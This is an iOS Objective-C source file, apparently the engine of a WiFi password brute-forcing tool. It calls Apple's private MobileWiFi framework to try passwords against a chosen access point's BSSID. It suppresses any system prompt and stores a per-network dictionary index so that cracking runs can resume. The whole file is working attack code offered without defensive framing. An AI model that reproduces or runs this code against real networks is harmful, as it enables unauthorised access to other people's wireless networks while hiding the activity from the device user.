#import "PhantomEngine.h"
#import <dlfcn.h>
#import <CoreFoundation/CoreFoundation.h>

typedef struct __WiFiManagerClient* WiFiManagerClientRef;
typedef struct __WiFiDeviceClient* WiFiDeviceClientRef;
typedef struct __WiFiNetwork* WiFiNetworkRef;

typedef WiFiManagerClientRef (*WiFiManagerClientCreateFunc)(CFAllocatorRef, int);
typedef CFArrayRef (*WiFiManagerClientCopyDevicesFunc)(WiFiManagerClientRef);
typedef WiFiNetworkRef (*WiFiDeviceClientCopyCurrentNetworkFunc)(WiFiDeviceClientRef);
typedef CFArrayRef (*WiFiDeviceClientCopyNetworksFunc)(WiFiDeviceClientRef);
typedef int (*WiFiDeviceClientAssociateAsyncFunc)(WiFiDeviceClientRef, WiFiNetworkRef, CFStringRef, void*, void*);
typedef CFStringRef (*WiFiNetworkGetPropertyFunc)(WiFiNetworkRef, CFStringRef);

@implementation PhantomEngine

// 断点记录：获取上次跑到的字典索引
+ (NSInteger)getLastTriedIndexForBSSID:(NSString *)bssid {
    if (!bssid || bssid.length == 0) return 0;
    return [[NSUserDefaults standardUserDefaults] integerForKey:[NSString stringWithFormat:@"WiFiProgress_%@", bssid]];
}

// 保存当前爆破进度
+ (void)saveProgressIndex:(NSInteger)index forBSSID:(NSString *)bssid {
    if (!bssid || bssid.length == 0) return;
    [[NSUserDefaults standardUserDefaults] setInteger:index forKey:[NSString stringWithFormat:@"WiFiProgress_%@", bssid]];
    [[NSUserDefaults standardUserDefaults] synchronize];
}

// 私有底层静默关联（无任何系统弹窗）
+ (void)silentTryConnectBSSID:(NSString *)bssid password:(NSString *)password completion:(void(^)(BOOL success))completion {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        void *handle = dlopen("/System/Library/PrivateFrameworks/MobileWiFi.framework/MobileWiFi", RTLD_LAZY);
        if (!handle) {
            dispatch_async(dispatch_get_main_queue(), ^{ if (completion) completion(NO); });
            return;
        }

        WiFiManagerClientCreateFunc createClient = (WiFiManagerClientCreateFunc)dlsym(handle, "WiFiManagerClientCreate");
        WiFiManagerClientCopyDevicesFunc copyDevices = (WiFiManagerClientCopyDevicesFunc)dlsym(handle, "WiFiManagerClientCopyDevices");
        WiFiDeviceClientCopyNetworksFunc copyNetworks = (WiFiDeviceClientCopyNetworksFunc)dlsym(handle, "WiFiDeviceClientCopyNetworks");
        WiFiDeviceClientAssociateAsyncFunc associateAsync = (WiFiDeviceClientAssociateAsyncFunc)dlsym(handle, "WiFiDeviceClientAssociateAsync");
        WiFiNetworkGetPropertyFunc getProp = (WiFiNetworkGetPropertyFunc)dlsym(handle, "WiFiNetworkGetProperty");

        if (!createClient || !copyDevices || !copyNetworks || !associateAsync || !getProp) {
            dlclose(handle);
            dispatch_async(dispatch_get_main_queue(), ^{ if (completion) completion(NO); });
            return;
        }

        WiFiManagerClientRef mgr = createClient(kCFAllocatorDefault, 0);
        CFArrayRef devs = copyDevices(mgr);
        if (!devs || CFArrayGetCount(devs) == 0) {
            if (devs) CFRelease(devs);
            CFRelease(mgr);
            dlclose(handle);
            dispatch_async(dispatch_get_main_queue(), ^{ if (completion) completion(NO); });
            return;
        }

        WiFiDeviceClientRef dev = (WiFiDeviceClientRef)CFArrayGetValueAtIndex(devs, 0);
        CFArrayRef networks = copyNetworks(dev);
        WiFiNetworkRef targetNet = NULL;

        if (networks) {
            CFIndex count = CFArrayGetCount(networks);
            for (CFIndex i = 0; i < count; i++) {
                WiFiNetworkRef net = (WiFiNetworkRef)CFArrayGetValueAtIndex(networks, i);
                NSString *netBSSID = (__bridge NSString *)getProp(net, CFSTR("BSSID"));
                if ([netBSSID isEqualToString:bssid]) {
                    targetNet = net;
                    break;
                }
            }
        }

        if (!targetNet) {
            if (networks) CFRelease(networks);
            CFRelease(devs);
            CFRelease(mgr);
            dlclose(handle);
            dispatch_async(dispatch_get_main_queue(), ^{ if (completion) completion(NO); });
            return;
        }

        // 底层静默发起关联请求
        CFStringRef passRef = (__bridge CFStringRef)password;
        associateAsync(dev, targetNet, passRef, NULL, NULL);

        // 等待硬件帧应答（1.2 秒判断是否握手成功）
        [NSThread sleepForTimeInterval:1.2];

        // 检查当前设备连接的网络是否为目标 BSSID
        WiFiDeviceClientCopyCurrentNetworkFunc copyCurrent = (WiFiDeviceClientCopyCurrentNetworkFunc)dlsym(handle, "WiFiDeviceClientCopyCurrentNetwork");
        BOOL isConnected = NO;
        if (copyCurrent) {
            WiFiNetworkRef currentNet = copyCurrent(dev);
            if (currentNet) {
                NSString *curBSSID = (__bridge NSString *)getProp(currentNet, CFSTR("BSSID"));
                if ([curBSSID isEqualToString:bssid]) {
                    isConnected = YES;
                }
                CFRelease(currentNet);
            }
        }

        if (networks) CFRelease(networks);
        CFRelease(devs);
        CFRelease(mgr);
        dlclose(handle);

        dispatch_async(dispatch_get_main_queue(), ^{
            if (completion) completion(isConnected);
        });
    });
}

@end
